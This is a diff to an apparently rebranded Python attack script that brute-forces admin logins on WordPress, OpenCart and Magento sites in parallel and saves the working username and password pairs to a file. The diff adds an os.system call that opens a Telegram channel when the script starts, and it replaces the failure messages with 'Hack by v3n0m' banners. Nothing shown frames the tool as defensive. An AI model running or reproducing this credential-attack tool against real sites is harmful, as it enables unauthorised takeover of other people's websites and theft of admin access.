@@ -33,6 +33,7 @@ print(spe.g + """
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀
 [@V3n0M_Cyber]
 """)
+os.system("xdg-open https://t.me/V3n0M_Cyber")
 	
 session = requests.Session()
 
@@ -54,7 +55,7 @@ def wordpress(site):
 						f.write("WordPress  -->  " + site + "/wp-login.php : " + admin + " : " + passwd + "\n")
 					break
 				else:
-					print(spe.r + "Failed!  -->  " + site + "/wp-login.php : " + admin + " : " + passwd)
+					print(spe.r + "Hack by v3n0m  " + site + "/wp-login.php : " + admin + " : " + passwd)
 			else:
 				break
 	except:
@@ -109,7 +110,7 @@ def opencart(site):
 						f.write("OpenCart  -->  " + site + "/admin/index.php : " + admin + " : " + passwd + "\n")
 					break
 				else:
-					print(spe.r + "Failed!  -->  " + site + "/admin/index.php : " + admin + " : " + passwd)
+					print(spe.r + "Hack by v3n0m  " + site + "/admin/index.php : " + admin + " : " + passwd)
 			else:
 				break
 	except:
@@ -136,7 +137,7 @@ def magento(site):
 						f.write("Magento  -->  " + site + "/admin : " + admin + " : " + passwd + "\n")
 					break
 				else:
-					print(spe.r + "Failed!  -->  " + site + "/admin : " + admin + " : " + passwd)
+					print(spe.r + "Hack by v3n0m  " + site + "/admin : " + admin + " : " + passwd)
 			else:
 				break
 	except:
@@ -168,5 +169,5 @@ try:
 	pp = Pool(100)
 	pr = pp.map(cms,sites)
 except:
-	print(spe.e + "Files not found! Please try again!")
+	print(spe.e + "stop V3n0m")
 	sys.exit()
